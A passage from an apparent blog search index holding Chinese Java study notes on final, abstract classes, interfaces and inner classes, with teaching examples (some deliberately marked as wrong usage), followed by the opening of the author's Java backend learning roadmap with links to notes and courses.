RATE = 0.08;//定义时赋值\n    ```\n\n  - ②在构造器中\n\n  - ```java\n    public AA() {//构造器中赋值\n    TAX_RATE2 = 1.1;\n    }\n    ```\n\n  - ③在代码块中\n\n  - ```java\n    {//在代码块赋值\n    TAX_RATE3 = 8.8;\n    }\n    ```\n\n3. final 修饰的属性是静态的，则初始化的位置只能是\n\n   - ①定义时、在静态代码块\n\n   - ```java\n     public static final double TAX_RATE = 99.9;\n     \n     static {\n     TAX_RATE2 = 3.3;\n     }\n     ```\n\n   - ②不能在构造器中赋值\n\n\n4. final 类不能继承，但是可以实例化对象。\n\n5. 如果类不是 final 类，但是含有 final 方法，则该方法虽然不能重写，但是可\n   以被继承。\n\n6. 一般来说，如果一个类已经是 final 类了，就没有必要再将方法修饰成final方法。\n\n7. final 不能修饰构造方法(即构造器)。\n\n8. final 和 static 往往搭配使用，效率更高，不会导致类加载底层编译器做了优化处理。\n\n9. 包装类(Integer,Double,Float, Boolean等都是 final )，String 也是 final 类。\n\n### 抽象类\n\n#### 抽象类引出\n\n当父类的某些方法，需要声明，但是又不确定如何实现时，可以将其声明为\n抽象方法， 那么这个类就是抽象类\n\n```java\nclass Animal {\n    private String name;\n  \n    public Animal(String name) {\n    \tthis.name = name;\n    }\n    //eat这里实现了，其实没有什么意义\n    public void eat() {\n    \t\tSystem.out.println(\"这是一个动物，但是不知道吃什么..\");\n    }\n}\n```\n\n考虑将该方法设计为抽象(abstract)方法，所谓抽象方法就是没有实现的方法，所谓没有实现就是指，没有方法体。当一个类中存在抽象方法时，需要将该类声明为 abstract 类， 一般来说，抽象类会被继承，由其子类来实现抽象方法。\n\n```java\nabstract class Animal {\n    private String name;\n  \n    public Animal(String name) {\n    \tthis.name = name;\n    }\n    //只声明不实现\n\t\tpublic abstract void eat() ;\n}\t\n```\n\n#### 抽象类介绍\n\n当父类的一些方法不能确定时，可以用 abstract 关键字来修饰该方法，这个方法\n就是抽象方法，并且需要用 abstract 来修饰该类，这个类就叫抽象类。\n\n- 1、用 abstract 关键字来修饰一个类时，这个类就叫抽象类\n\n  - ```java\n    访问修饰符 abstract 类名{}\n    ```\n\n- 2、用 abstract 关键字来修饰一个方法时，这个方法就是抽象方法\n\n  - ```java\n    访问修饰符 abstract 返回类型 方法名(参数列表);//不能有方法体\n    ```\n\n- 3、抽象类的价值更多作用是在于设计，是设计者设计好后，让子类继承并实现抽象类()\n\n#### 抽象类注意事项\n\n- 1、抽象类不能被实例化\n- 2、抽象类不一定要包含 abstract 方法。 也就是说，抽象类可以没有 abstract 方法\n- 3、一旦类包含了 abstract 方法，则这个类必须声明为 abstract \n- 4、abstract 只能修饰类和方法，不能修饰属性和其它的\n- 5、如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，\n  除非它自己也声明为 abstract 类。\n- 6、抽象方法不能使用 private，final 和 static 来修饰，因为这些关键字都是和重写相违背的。\n- 7、抽象类可以有任意成员[抽象类本质还是类]，比如：非抽象方法、构造器、静态属性等等\n- 8、抽象方法不能有主体，即不能实现\n\n```java\npublic class AbstractDetail01 {\npublic static void main(String[] args) {\n    //1、抽象类，不能被实例化\n    new A();//错误写法\n\t}\n}\n\n//2、抽象类不一定要包含abstract方法。也就是说,抽象类可以没有abstract方法\nabstract class A {\n    public void hi() {\n    \t\tSystem.out.println(\"hi\");\n    }\n}\n\n//3、一旦类包含了abstract 方法,则这个类必须声明为abstract\nabstract class B {\n\t\tpublic abstract void hi();\n}\n\n//4、abstract 只能修饰类和方法，不能修饰属性和其它的\nclass C {\n\t\tpublic abstract int n1 = 1; //错误写法\n}\n\n//5、如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，\n除非它自己也声明为 abstract 类。\nclass D extens B {\n  @Override\n  public void hi() { \n    //这里相等于D子类实现了父类B的抽象方法，所谓实现方法，就是有方法体\n  }\n}\n\n//6、抽象方法不能使用 private, final 和 static 来修饰，因为这些关键字都是和重写相违背的。\nabstract class E {\n\t\tprivate abstract void hi();//错误写法\n  \tpublic final abstract void hi();//错误写法\n  \tpublic static abstract void hi();//错误写法\n  \n}\n\n//7、抽象类的本质还是类，所以可以有类的各种成员\nabstract class F {\n    public int n1 = 10;\n    public static String name = \"测试\";\n    public void hi() {\n    \t\tSystem.out.println(\"hi\");\n    }\n    public abstract void hello();\n    public static void ok() {\n    \t\tSystem.out.println(\"ok\");\n    }\n}\n//8、抽象方法不能有主体，即不能实现\nabstract class G {\n    public abstract void hello(){//错误写法\n      \n    }\n}\n```\n\n#### 抽象类最佳实践-模板设计模式\n\n抽象类体现的就是一种模板模式的设计，抽象类作为多个子类的通用模板，子类在抽象类的基础上进行扩展、改造，但子类总体上会保留抽象类的行为方式。\n\n模板设计模式能解决的问题\n\n- 1、当功能内部一部分实现是确定，一部分实现是不确定的。这时可以把不确定的部分暴露出去，让子类去实现。\n- 2、编写一个抽象父类，父类提供了多个子类的通用方法，并把一个或多个方法留给其子类实现，就是一种模板模式。\n\n栗子🌰：\n\n- 1.有多个类，完成不同的任务 job\n- 2.要求统计得到各自完成任务的时间\n\n请编程实现 TestTemplate.java\n\n```java\nabstract public class Template { //抽象类-模板设计模式\n    public abstract void job();//抽象方法\n    public void calculateTime() {//实现方法，调用job 方法\n        //得到开始的时间\n        long start = System.currentTimeMillis();\n        job(); //动态绑定机制\n        //得的结束的时间\n        long end = System.currentTimeMillis();\n        System.out.println(\"任务执行时间\" + (end - start));\n    }\n}\n\npublic class AA extends Template {\n    //计算任务1\n    @Override\n    public void job() { //实现Template 的抽象方法job\n        long num = 0;\n        for (long i = 1; i <= 800000; i++) {\n        \t\tnum += i;\n    \t\t}\n\t\t}\n}\n\npublic class BB extends Template {\n  \t//计算任务2\n   \t@Override\n    public void job() {\n    \t\tlong num = 0;\n      \tfor (long i = 1; i <= 80000; i++) {\n          \tnum *= i;\n      \t}\n\t \t}\n}\n\npublic class TestTemplate {\n  public static void main(String[] args) {\n      AA aa = new AA();\n      aa.calculateTime(); //多态\n      BB bb = new BB();\n      bb.calculateTime();\n\t}\n}\n```\n\n\n\n### 接口\n\n#### 接口简介\n\n接口就是给出一些没有实现的方法，封装到一起，到某个类要使用的时候，再根据具体情况把这些方法写出来。\n\n语法:\n\n```java\n//定义接口\ninterface 接口名{\n  属性;//实际上是 public static final 属性；\n  抽象方法; //实际上是 public abstract 抽象方法; \n  //接口中抽象方法可以不用 abstract 关键字\n}\n\n//实现接口\nclass 类名 implements 接口{\n\t自己属性;\n\t自己方法;\n  必须实现的接口的抽象方法\n}\n```\n\n- 接口是更加抽象的抽象类，抽象类里的方法可以有方法体，接口里的所有方法都没有方法体[jdk7.0]。\n\n- 接口体现了程序设计的多态和高内聚低偶合的设计思想。\n- 特别说明: Jdk8.0 后接口类可以有静态方法，默认方法，也就是说接口中可以有方法的具体实现。\n\n#### 接口注意事项\n\n- 1、接口不能被实例化\n- 2、接口中所有的方法是 public 方法，接口中抽象方法，可以不用 abstract修饰\n- 3、一个普通类实现接口,就必须将该接口的所有方法都实现。\n- 4、抽象类实现接口，可以不用实现接口的方法。\n\n```java\npublic class InterfaceDetail01 {\n\t\tpublic static void main(String[] args) {\n      //1.接口不能被实例化\n    \tnew IA();//错误写法\n\t\t}\n}\n\n//2.接口中所有的方法是public 方法, 接口中抽象方法，可以不用abstract 修饰\ninterface IA {\n    void say();//修饰符默认 public \n    void hi();//实际就是 public abstract void hi(); \n}\n\n\n//3.一个普通类实现接口,就必须将该接口的所有方法都实现,可以使用alt+enter 来解决\nclass Cat implements IA{\n    @Override\n    public void say() {\n    }\n    @Override\n    public void hi() {\n    }\n}\n\n//4.抽象类去实现接口时，可以不实现接口的抽象方法\nabstract class Tiger implements IA {\n}\n```\n\n- 5、一个类同时可以实现多 个接口\n- 6、接口中的属性，只能是 final 的，而且是 public static final 修饰符。\n  - 比如：int a= 1；实际上是 public static final int a=1; (必须初始化)\n- 7、接口中属性的访问形式：接口名.属性名\n- 8、接口不能继承其它的类，但是可以继承多个别的接口\n  - interface A extends B,C{}\n- 9、接口的修饰符只能是 public 和默认，这点和类的修饰符是一样的。\n\n```java\npublic class InterfaceDetail02 {\n    public static void main(String[] args) {\n        //接口中的属性,是public static final\n        System.out.println(IB.n1);//说明n1 就是static\n        //IB.n1 = 30; 说明n1 是final\n    }\n}\ninterface IB {\n    //接口中的属性,只能是final 的，而且是public static final 修饰符\n    int n1 = 10; //等价public static final int n1 = 10;\n    void hi();\n}\n\n//接口的修饰符只能是public 和默认，这点和类的修饰符是一样的\ninterface IC {\n\t\tvoid say();\n}\n\n//接口不能继承其它的类,但是可以继承多个别的接口\ninterface ID extends IB,IC {\n}\n\n//一个类同时可以实现多个接口\nclass Pig implements IB,IC {\n    @Override\n    public void hi() {\n    }\n    @Override\n    public void say() {\n    }\n}\n```\n\n#### 接口&继承\n\n- 当子类继承了父类，就自动的拥有父类的功能\n\n- 如果子类需要扩展功能，可以通过实现接口的方式扩展\n- 可以理解实现接口是对Java 单继承机制的一种补充\n\n```java\npublic class ExtendsVsInterface {\n    public static void main(String[] args) {\n        LittleMonkey wuKong = new LittleMonkey(\"悟空\");\n        wuKong.climbing();\n        wuKong.swimming();\n        wuKong.flying();\n    }\n\n}\n//猴子\nclass Monkey {\n    private String name;\n    public Monkey(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n    public void climbing() {\n        System.out.println(name + \" 会爬树...\");\n    }\n}\n//接口\ninterface Fishable {\n    void swimming();\n}\ninterface Birdable {\n    void flying();\n}\n\nclass LittleMonkey extends Monkey implements Fishable,Birdable {\n    public LittleMonkey(String name) {\n        super(name);\n    }\n    @Override\n    public void swimming() {\n        System.out.println(getName() + \" 通过学习，可以像鱼儿一样游泳...\");\n    }\n    @Override\n    public void flying() {\n        System.out.println(getName() + \" 通过学习，可以像鸟儿一样飞翔...\");\n    }\n}\n\n/*\n悟空 会爬树...\n悟空 通过学习，可以像鱼儿一样游泳...\n悟空 通过学习，可以像鸟儿一样飞翔...\n*/\n```\n\n接口和继承解决的问题不同\n\n- 继承的价值主要在于：解决代码的复用性和可维护性。\n- 接口的价值主要在于：设计，设计好各种规范(方法)，让其它类去实现这些方法，即更加的灵活。\n- 接口比继承更加灵活，继承是满足 is-a 的关系，而接口只需满足 like-a 的关系。\n- 接口在一定程度上实现代码解耦(代码相互依赖)[即:接口规范性+动态绑定机制]\n\n#### 接口的多态特性\n\n- 1)多态参数\n\n接口类型的变量可以指向实现了该接口类的对象实例\n\n例如 USB 接口，既可以接收手机对象，又可以接收相机对象，就体现了接口多态(接口引用可以指向实现了接口的类的对象)\n\n```java\npublic class InterfacePolyParameter {\n    public static void main(String[] args) {\n        //接口的多态体现\n        //接口类型的变量usb可以指向实现了USB接口类的对象实例\n        USB usb = new Phone();\n        usb = new Camera();\n\n        //继承体现的多态\n        //父类类型的变量father可以指向继承Farher的子类的对象实例\n        Farher father = new Son();\n        father = new Daughter();\n    }\n}\n\ninterface USB {}\nclass Phone implements USB{}\n\nclass Camera implements USB{}\n\nclass Farher {}\nclass Son extends Farher {}\nclass Daughter extends Farher {}\n```\n\n- 2)多态数组\n\n演示案例: 给 USB 数组中，存放 Phone 和相机对象， Phone 类还有一个特有的方法 call() ,请遍历 USB 数组，如果是 Phone 对象，除了调用 USB 接口定义的方法外，还需要调用 Phone 特有方法call\n\n```java\npublic class InterfacePolyArr {\n    public static void main(String[] args) {\n        USB[] usb = new USB[2];\n        usb[0] = new Phone();\n        usb[1] = new Camera();\n        for(int i = 0; i < usb.length; i++) {\n            usb[i].work();//动态绑定..\n            //需要进行类型的向下转型\n            if(usb[i] instanceof Phone) {//判断他的运行类型是Phone_\n                ((Phone) usb[i]).call();\n            }\n        }\n    }\n}\n\ninterface USB {\n    void work();\n}\nclass Phone implements USB{\n    public void call() {\n        System.out.println(\"手机可以打电话...\");\n    }\n\n    @Override\n    public void work() {\n        System.out.println(\"手机工作中...\");\n    }\n}\n\nclass Camera implements USB{\n    @Override\n    public void work() {\n        System.out.println(\"相机工作中...\");\n    }\n}\n```\n\n- 3)多态传递\n\n如果一个类 Teacher 实现了接口 IG ，IG 接口继承了 IH 接口，那么，实际上就相当于Teacher 类也实现了 IH 接口，这就是接口多态传递现象\n\n```java\npublic class InterfacePolyPass {\n    public static void main(String[] args) {\n        //接口类型的变量可以指向，实现了该接口的类的对象实例\n        IG ig = new Teacher();\n        //如果IG 继承了IH 接口，而Teacher 类实现了IG 接口\n        //那么，实际上就相当于Teacher 类也实现了IH 接口.\n        //这就是所谓的接口多态传递现象.\n        IH ih = new Teacher();\n    }\n}\ninterface IH {\n    void hi();\n}\ninterface IG extends IH{}\n\nclass Teacher implements IG {\n    @Override\n    public void hi() {\n    }\n}\n```\n\n练习：判断代码是否有误并改进\n\n```java\npublic class InterfaceExercise02 {\n    public static void main(String[] args) {\n        new C().pX();\n    }\n}\n\ninterface A { \n    int x = 0;//等价public static final int x = 0;\n} \nclass B {\n    int x = 1;//普通属性\n} \nclass C extends B implements A {\n    public void pX() {\n        System.out.println(x); //错误，原因不明确x\n      \t//改进\n        //访问接口的x就使用A.x\n        //访问父类的x就使用super.x\n        System.out.println(A.x + \" \" + super.x);   \n    }\n}\n```\n\n### 内部类\n\n#### 简介\n\n一个类的内部又完整的嵌套了另一个类结构。被嵌套的类称为内部类(inner class)，嵌套其他类的类称为外部类(outer class)。 \n\n内部类最大的特点就是可以直接访问私有属性，并且可以体现类与类之间的包含关系\n\n```java\n//语法\nclass Outer{ //外部类\n    class Inner{ //内部类\n    }\n}\nclass Other{ //外部其他类\n}\n```\n\n类的五大成员：[属性、方法、构造器、代码块、内部类]\n\n#### 分类\n\n定义在局部位置(方法中/代码块) :\n\n- (1) 局部内部类（有类名）\n- (2) 匿名内部类（没有类名）\n\n定义在成员位置：\n\n- (1) 成员内部类（没用 static 修饰）\n- (2) 静态内部类（使用 static 修饰）\n\n#### 局部内部类\n\n局部内部类是定义在外部类的局部位置(方法中或者代码块中)，并且有类名。\n\n- 1.不能添加访问修饰符，因为它的地位就是一个局部变量。局部变量是不能使用修饰符的。但是可以使用 final 修饰，因为局部变量也可以使用 final\n- 2.作用域：仅仅在定义它的方法或代码块中。\n- 3.局部内部类访向外部类的成员\n  - 访问方式：可以直接访问外部类的所有成员，包含私有的\n- 4.外部类访向局部内部类的成员\n  - 访问方式：创建局部内部类的对象，再访问(注意:必须在作用域内)\n\n- 5.外部其他类不能访向局部内部类(因为局部内部类地位是一个局部变量)\n- 6.如果外部类和局部内部类的成员重名时\n  - 默认遵循就近原则\n  - 如果想访问外部类的成员，则可以使用(外部类名.this.成员)去访问\n\n```java\npackage com.jwt.innerclass;\n\npublic class LocalInnerClass {\n    public static void main(String[] args) {\n        Outer outer = new Outer();\n        outer.m1();\n    }\n}\n\nclass Outer {//外部类\n    private int n1 = 100;\n    private int n2 = 700;\n    //私有方法\n    private void m2() {\n        System.out.println(\"外部类的私有方法 m2()\");\n    }\n\n    //方法\n    public void m1() {\n        //1.不能添加访问修饰符,但是可以使用final 修饰\n        //2.作用域: 仅仅在定义它的方法或代码块中\n        final class Inner {//局部内部类\n            private int n1 = 800;//与外部类成员重名\n            public void f1() {\n                // 3.可以直接访问外部类的所有成员，包含私有的\n                System.out.println(\"n2=\" + n2 );\n                m2();\n                //6. 如果外部类和局部内部类的成员重名时，\n                //1)默认遵循就近原则，\n                System.out.println(\"n1=\" + n1 );\n                // 2)如果想访问外部类的成员，使用（外部类名.this.成员）去访问\n                System.out.println(\"n1=\" + Outer.this.n1);\n            }\n        }\n        //4. 外部类访向局部内部类的成员，创建局部内部类的对象，再访问\n        Inner inner = new Inner();\n        inner.f1();\n        System.out.println(\"外部类访问局部内部类的n1=\" + inner.n1);\n    }\n}\n```\n\n#### 匿名内部类\n\n匿名内部类是定义在外部类的局部位置(方法中或者代码块中)，并且没有类名\n\n- 匿名内部类本质是类\n- 同时还是一个对象\n\n匿名内部类的基本语法\n\n```java\nnew 类或接口(参数列表){\n\t\t类体\n};\n```\n\n匿名内部类的语法比较奇特， 匿名内部类既是一个类的定义，同时它本身也是一个对象，因此从语法上看，它既有定义类的特征，也有创建对象的特征\n\n- 1.不能添加访问修饰符，因为它的地位就是一个局部变量。\n- 2.作用域：仅仅在定义它的方法或代码块中。\n- 3.匿名内部类访向外部类成员\n  - 访问方式：可以直接访问外部类的所有成员，包含私有的\n- 4.外部其他类不能访匿名内部类(因为匿名内部类地位是一个局部变量)\n- 5.如果外部类和匿名内部类的成员重名时，匿名内部类访问的话\n  - 默认遵循就近原则\n  - 如果想访问外部类的成员，则可以使用(外部类名.this.成员) 去访问\n  \n\n```java\npackage com.jwt.innerclass;\n\npublic class AnonymousInnerClass {\n    public static void main(String[] args) {\n        Outer05 outer05 = new Outer05();\n        outer05.f1();\n    }\n\n}\n\nclass Outer05 {\n    private int n1 = 100;\n    private int n2 = 700;\n\n    public void f1() {\n        //1.不能添加访问修饰符\n        //2.作用域: 仅仅在定义它的方法或代码块中\n         Person p = new Person() {//创建一个基于类的匿名内部类\n            private int n1 = 800;//与外部类成员重名\n            @Override\n            public void hi() {\n                //3.可以直接访问外部类的所有成员，包含私有的\n                System.out.println(\"n2=\" + n2 );\n                //5.如果外部类和匿名内部类的成员重名时，匿名内部类访问的话\n                //1)默认遵循就近原则\n                System.out.println(\"n1=\" + n1 );\n                //2)如果想访问外部类的成员，则可以使用（外部类名.this.成员）去访问\n                System.out.println(\"n1=\" + Outer05.this.n1 );\n            }\n        };\n         p.hi();//动态绑定\n\n        //也可以直接调用, 匿名内部类本身也是返回对象\n         new Person(){\n             @Override\n             public void ok(String str) {\n                 super.ok(str);\n             }\n         }.ok(\"jack\");\n    }\n}\n\n\n\nclass Person {//类\n    public void hi() {\n        System.out.println(\"Person hi()\");\n    }\n\n    public void ok(String str) {\n        System.out.println(\"Person ok() \" + str);\n    }\n}\n```\n\n**匿名内部类的最佳实践**：当做实参直接传递，简洁高效\n\n```java\npackage com.jwt.innerclass;\n\npublic class InnerClassExercise01 {\n    public static void main(String[] args) {\n        \n        //当做实参直接传递，简洁高效\n        f1(new IL() {\n            @Override\n            public void show() {\n                System.out.println(\"这是一副名画~~...\");\n            }\n        });\n\n        //传统方法\n        f1(new Picture());\n    }\n    //静态方法,形参是接口类型\n    public static void f1(IL il) {\n        il.show();\n    }\n}\n\n//接口\ninterface IL {\n    void show();\n}\n\n//类->实现IL\nclass Picture implements IL {\n    @Override\n    public void show() {\n        System.out.println(\"这是一副名画XX...\");\n    }\n}\n```\n\n练习：\n\n1.有一个铃声接口 Bell，里面有个 ring 方法。\n2.有一个手机类 Cellphone, 具有闹钟功能 alarmclock，参数是 Bell 类型\n3.测试手机类的闹钟功能，通过匿名内部类(对象)作为参数，打印:懒猪起床了\n4.再传入另一个匿名内部类(对象)，打印:小伙伴上课了\n\n```java\npackage com.jwt.innerclass;\n\npublic class InnerClassExercise02 {\n    public static void main(String[] args) {\n        Cellphone cellphone = new Cellphone();\n        cellphone.alarmclock(new Bell() {\n            @Override\n            public void ring() {\n                System.out.println(\"懒猪起床了\");\n            }\n        });\n        cellphone.alarmclock(new Bell() {\n            @Override\n            public void ring() {\n                System.out.println(\"小伙伴上课了\");\n            }\n        });\n    }\n}\n\ninterface Bell{\n    void ring();\n}\n\nclass Cellphone {\n    public void alarmclock(Bell bell){\n        System.out.println(bell.getClass());\n        bell.ring();//动态绑定\n    }\n}\n```\n\n#### 成员内部类\n\n成员内部类是定义在外部类的成员位置，并且没有 static 修饰。\n\n- 1.可以添加任意访问修饰符(public、protected 、默认、private)，因为它的地位就是一个成员。\n- 2.作用域：和外部类的其他成员一样，为整个类体 \n- 3.成员内部类访向外部类成员(比如:属性) \n  - 访问方式：可以直接访问外部类的所有成员，包含私有的\n- 4.外部类访问成员内部类\n  - 访问方式：创建对象， 再访问\n- 5.外部其他类访问成员内部类\n\n```java\n//方式一：外部类名.成员内部类名 对象名 = 外部类名.new 成员内部类名()\nOuter.Inner inner = Outer.new Inner()\n  \n//方式二:在外部类中编写一个方法，返回成员内部类对象\npublic class Inner{\n  ...\n    public Inner getInnerInstance(){\n    \t\treturn new Inner();\n  }\n}\nOuter outer = new Outer()\nouter.getInnerInstance()\n```\n\n- 6.如果外部类和内部类的成员重名时， 内部类访问的话\n  - 默认遵循就近原则\n  - 如果想访问外部类的成员，则可以使用(外部类名.this.成员)去访问\n\n#### 静态内部类\n\n静态内部类是定义在外部类的成员位置，并且有 static 修饰。\n\n- 1.可以添加任意访问修饰符(public、 protected、 默认、private),因为它的地位就是一个成员。\n- 2.作用域：同其他的成员，为整个类体\n- 3.静态内部类访问外部类(比如:静态属性) \n  - 访问方式：可以直接访问外部类的所有静态成员，包含私有的，但不能直接访问非静态成员\n- 4.外部类访问静态内部类\n  - 访问方式：创建对象，再访问\n- 5.外部其他类访问静态内部类\n\n```java\n//方式一：外部类名.成员内部类名 对象名 = 外部类名.new 成员内部类名()\nOuter.Inner inner = new Outer.Inner()\n  \n  \n//方式二:在外部类中编写一个方法，返回成员内部类对象\nstatic class Inner{\n    ...\n      \n    public Inner getInnerInstance(){\n    \t\treturn new Inner();\n  }\n}\nOuter outer = new Outer()\nouter.getInnerInstance()  \n//或者\nOuter.getInnerInstance()  \n```\n\n- 6.如果外部类和静态内部类的成员重名时，静态内部类访问的时，\n  - 默认遵循就近原则\n  - 如果想访问外部类的成员，则可以使用(外部类名.成员) 去访问\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["对象"],"categories":["JavaSE"]},{"title":"Java-学习路线","url":"/posts/29829.html","content":"\n哈喽，大家好呀！安全出身的小简做出了人生中又一重大的决定，那就是从安全方向逐渐转为开发方向，小简自己也纠结了很久，尽管知道这样会很难，但最终还是做下了这个决定，至于原因嘛，应该是我对开发更有兴趣一些，也想去尝试一些新的东西，当然我也不是完全放弃安全，只是近一年左右时间我会将重心放在开发方向(当然是利用课余时间，小简的主业还是一名研究生，平时需要完成老师给的科研任务)，接下来小简将做一个 “Java 从 0 到 1” 的实验，以自己为实验对象，从零开始学习Java，下方是小简参考网上资料、请教前辈整理出来的 Java 学习路线，目前还不完善，会在学习的过程中持续不断的更新！我将按照整理的路线从 0 开始学 Java 后端的知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n| <center>Notations</center> | <center>explanation</center> |\n| :------------------------- | :--------------------------: |\n| <center>✅</center>         |  <center>代表已学</center>   |\n| <center>☑️</center>         |  <center>代表未学</center>   |\n| <center>📌</center>         | <center>代表正在学</center>  |\n| <center>🔄</center>         | <center>代表需复习</center>  |\n\n## JavaSE\n\n> **必知必会** \n\n| 名称     | 状态 | 笔记[汇总](https://jwt1399.top/categories/JavaSE/)           |\n| -------- | ---- | ------------------------------------------------------------ |\n| 面向对象 | ✅    | [Java-面向对象 \\|  简简](https://jwt1399.top/posts/64598.html) |\n| 枚举     | ✅    | [Java-枚举 \\| 简简](https://jwt1399.top/posts/9855.html#toc-heading-7) |\n| 注解     | ✅    | [Java-注解 \\| 简简](https://jwt1399.top/posts/9855.html#toc-heading-15) |\n| 常用类   | ✅    | [Java-常用类 \\| 简简](https://jwt1399.top/posts/33453.html)  |\n| 集合     | ✅    | [Java-集合 \\| 简简](https://jwt1399.top/posts/6773.html)     |\n| 异常     | ✅    | [Java-异常 \\| 简简](https://jwt1399.top/posts/9855.html#toc-heading-16) |\n| 泛型     | ✅    | [Java-泛型 \\| 简简](https://jwt1399.top/posts/9855.html#toc-heading-28) |\n| 线程     | ✅    | [Java-线程 \\| 简简](https://jwt1399.top/posts/18034.html)    |\n| IO流     | ✅    | [Java-IO流 \\| 简简](https://jwt1399.top/posts/52970.html)    |\n| 网络编程 | ✅    | [Java-网络编程 \\| 简简](https://jwt1399.top/posts/43348.html) |\n| JDBC     | ✅    | [Java-JDBC \\| 简简](https://jwt1399.top/posts/146.html)      |\n| 8新特性  | ✅    | [Java 8 新特性 \\| 简简](https://jwt1399.top/posts/58320.html) |\n| 反射     | ✅    | [Java-反射 \\| 简简](https://jwt1399.top/posts/13406.html)    |\n| 正则     | 🔄    |                                                              |\n| 汇总篇   | ✅    | [JavaSE-汇总 \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/9855.html) |\n\n> **学习资源**\n\n- [韩顺平-零基础30天学会Java](https://www.bilibili.com/video/BV1fh411y7R8)\n- [尚硅谷 Java8 新特性教程](https://www.bilibili.com/video/BV14W411u7Ly)\n\n## JavaWeb\n\n> 必知必会\n\n| 名称              | 状态 | 笔记[汇总](https://jwt1399.top/categories/JavaWeb/)          |\n| ----------------- | ---- | ------------------------------------------------------------ |\n| HTML、CSS、JS     | ✅    | [前端三剑客 \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/38162.html) |\n| Tomcat            | ✅    | [Tomcat \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/4688.html#toc-heading-3) |\n| Servlet           | ✅    | [Servlet \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/55715.html) |\n| Cookie & Session  | ✅    | [Cookie & Session \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/37985.html) |\n| filter & Listener | ✅    | [filter & Listener \\|简简 (jwt1399.top)](https://jwt1399.top/posts/4688.html#toc-heading-6) |\n| JSP（可不学）     | ✅    | [JSP学习笔记 \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/59789.html) |\n| Thymeleaf         | ✅    | [Thymeleaf \\|简简 (jwt1399.top)](https://jwt1399.top/posts/4688.html#toc-heading-12) |\n| Ajax、 Axios      | ✅    | [Ajax & Axios  \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/16553.html) |\n| Vue、Element UI   | ✅    | [Vue & Element \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/28587.html) |\n\n## 开发框架\n\n> **必知必会**\n\n| 名称                | 状态 | 笔记[汇总](http://localhost:4000/categories/Spring/)         |\n| ------------------- | ---- | ------------------------------------------------------------ |\n| Spring              | ✅    | [Spring \\| 简简 (jwt1399.top)](https://jwt1399.top/categories/Spring/) |\n| SpringMVC           | ✅    | [SpringMVC  \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/4780.html) |\n| Mybatis             | ✅    | [Mybatis \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/13919.html) |\n| Mybatis plus        | ✅    | [MyBatis-Plus  简简 (jwt1399.top)](https://jwt1399.top/posts/11146.html) |\n| SSM整合             | ✅    | [SSM整合 \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/42096.html) |\n| SpringBoot基础篇    | ✅    | [SpringBoot-基础篇 \\| 简简 (jwt1399.top)](https://jwt1399.top/posts/33757.html) |\n| SpringBoot实用篇    | ✅    | [SpringBoot-实用篇 \\|简简 (jwt1399.top)](https://jwt1399.top/posts/37881.html) |\n| SpringBoot整合篇    | 📌    | [SpringBoot-整合篇 \\|简简](https://jwt1399.top/posts/58591.html) |\n| SpringBoot原理篇    | ✅    | [SpringBoot-原理篇 \\|简简](http://localhost:4000/posts/41747.html) |\n| SpringBoot项目篇    | ☑️    |                                                              |\n| Spring全家桶-面试篇 | ☑️    |                                                              |\n\n> **学习资源**\n\n- [尚硅谷Spring框架视频教程](https://www.bilibili.com/video/BV1Vf4y127N5)\n- [尚硅谷SpringMVC教程](https://www.bilibili.com/video/BV1Ry4y1574R/)\n- [尚硅谷2022版MyBatis教程](https://www.bilibili.com/video/BV1VP4y1c7j7)\n- [尚硅谷2022版MyBatisPlus教程](https://www.bilibili.com/video/BV12R4y157Be)\n- [黑马程序员SpringBoot2全套视频教程](https://www.bilibili.com/video/BV15b4y1a7yG?vd_source=fa98a6d1417d05689c64bc1449966321)\n\n## 数据库\n\n> **必知必会**\n\n| 名称          | 状态 | 笔记                                                         |\n| ------------- | ---- | ------------------------------------------------------------ |\n| MySQL         | ✅    | [MySQL-学习笔记 \\|简简 (jwt1399.top)](https://jwt1399.top/posts/27695.html) |\n| Redis         | ✅    | [Redis \\|简简 (jwt1399.top)](https://jwt1399.top/posts/27273.html) |\n| ElasticSearch | ☑️    |                                                              |\n| MySQL优化     | ☑️    |                                                              |\n\n> **学习资源**\n\n- 《MySQL 必知必会》\n- 《高性能 MySQL》\n- 《MySQL 技术内幕》\n- 《Redis 设计与实现》\n\n## 微服务\n\n> **必知必会**\n\n- Spring Cloud📌\n\n  - 注册/发现：Eureka✅、Nacos✅、Zookeeper☑️\n\n  - 服务调用：RestTemplate✅、OpenFeign✅、Dubbo☑️\n  - 服务配置：Nacos✅\n  - 服务网关：Getaway✅\n  - 负载均衡：Ribbon✅\n  - 消息队列：RabbitMQ✅、RabbitMQ☑️、kafka☑️\n  - 服务保护：Sentinel✅\n  - 事务：Seata✅\n  - 认证鉴权：Spring Security☑️、Oauth2☑️、shiro☑️\n\nOther\n\n- Netty☑️\n\n> 学习资源\n\n- 极客时间《消息队列高手课》\n- 极客时间《RPC 实战与核心原理》\n- 《从 paxos 到 zookeeper》\n- 《Netty in Action》\n- [MIT6.824 (gitbook.io)](https://mit-public-courses-cn-translatio.gitbook.io/mit6-824/)\n\n## Java进阶\n\n> 